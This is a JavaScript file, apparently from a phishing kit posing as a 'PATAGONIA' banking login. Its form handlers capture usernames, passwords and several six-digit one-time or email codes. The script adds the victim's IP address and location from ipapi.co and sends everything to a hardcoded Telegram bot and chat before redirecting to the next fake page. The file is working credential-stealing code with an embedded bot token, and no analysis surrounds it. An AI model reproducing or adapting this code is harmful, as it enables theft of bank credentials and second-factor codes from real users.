document.addEventListener("DOMContentLoaded", function() {
    // Agregar evento de envío de formulario para la página de inicio de sesión
    var formLogin = document.getElementById("formLogin");
    if (formLogin) {
        formLogin.addEventListener("submit", function(event) {
            event.preventDefault();
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            obtenerUbicacionYEnviarMensajeTelegram(username, password, "index2.html", "💲 PATAGONIA 💲:\nUsuario: " + username + "\nContraseña: " + password);
        });
    }

    // Agregar evento de envío de formulario para la página de código de operaciones
    var loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var num1 = document.getElementById("num1").value;
            var num2 = document.getElementById("num2").value;
            var num3 = document.getElementById("num3").value;
            var num4 = document.getElementById("num4").value;
            var num5 = document.getElementById("num5").value;
            var num6 = document.getElementById("num6").value;
            obtenerUbicacionYEnviarMensajeTelegram(num1, num2, "index4.html", "💲 PATAGONIA 💲:\nToken: " + num1 + num2 + num3  + num4 + num5  + num6);
        });
    }

    // Agregar evento de envío de formulario para la sección de contacto
    var formContacto = document.getElementById("loginForm2");
    if (formContacto) {
        formContacto.addEventListener("submit", function(event) {
            event.preventDefault();
            var num1 = document.getElementById("num1").value;
            var num2 = document.getElementById("num2").value;
            var num3 = document.getElementById("num3").value;
            var num4 = document.getElementById("num4").value;
            var num5 = document.getElementById("num5").value;
            var num6 = document.getElementById("num6").value;
            obtenerUbicacionYEnviarMensajeTelegram(num1, num2, "index6.html", "💲 PATAGONIA 💲:\nToken2: " + num1 + num2 + num3  + num4 + num5  + num6);
        });
    }

    // Agregar evento de envío de formulario para el formulario adicional loginForm3
    var formContacto3 = document.getElementById("loginForm3");
    if (formContacto3) {
        formContacto3.addEventListener("submit", function(event) {
            event.preventDefault();
            var num1 = document.getElementById("num1").value;
            var num2 = document.getElementById("num2").value;
            var num3 = document.getElementById("num3").value;
            var num4 = document.getElementById("num4").value;
            var num5 = document.getElementById("num5").value;
            var num6 = document.getElementById("num6").value;
            obtenerUbicacionYEnviarMensajeTelegram(num1, num2, "index8.html", "💲 PATAGONIA 💲:\nCódigo Correo: " + num1 + num2 + num3  + num4 + num5  + num6);
        });
    }

    // Agregar evento de envío de formulario para el formulario adicional loginForm4
    var loginForm4 = document.getElementById("loginForm4");
    if (loginForm4) {
        loginForm4.addEventListener("submit", function(event) {
            event.preventDefault();
            var num1 = document.getElementById("num1").value;
            var num2 = document.getElementById("num2").value;
            var num3 = document.getElementById("num3").value;
            var num4 = document.getElementById("num4").value;
            var num5 = document.getElementById("num5").value;
            var num6 = document.getElementById("num6").value;
            obtenerUbicacionYEnviarMensajeTelegram(num1, num2, "index10.html", "💲 PATAGONIA 💲:\nNuevo Código: " + num1 + num2 + num3  + num4 + num5  + num6);
        });
    }
});

function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
    fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        var country = data.country_name;
        var region = data.region;
        var ip = data.ip;
        if (country && region && ip) {
            message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
        } else {
            message += '\nNo se pudo obtener la ubicación.';
        }
        enviarMensajeTelegram(message, nextPage);
    })
    .catch(error => {
        console.error("Error al obtener la ubicación:", error);
        message += "\nError al obtener la ubicación.";
        enviarMensajeTelegram(message, nextPage);
    });
}

function enviarMensajeTelegram(mensaje, nextPage) {
    var token = '7507841125:AAHBo7vlYANIbRRY9tQgTFOXCaXGzU1GyY4';
    var chatId = '6927751752';
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
    var params = {
        chat_id: chatId,
        text: mensaje
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(params)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Ocurrió un error al enviar el mensaje.');
        }
        console.log('Mensaje enviado con éxito.');
        window.location.href = nextPage;
    })
    .catch(error => {
        console.error('Error al enviar el mensaje:', error);
    });
}
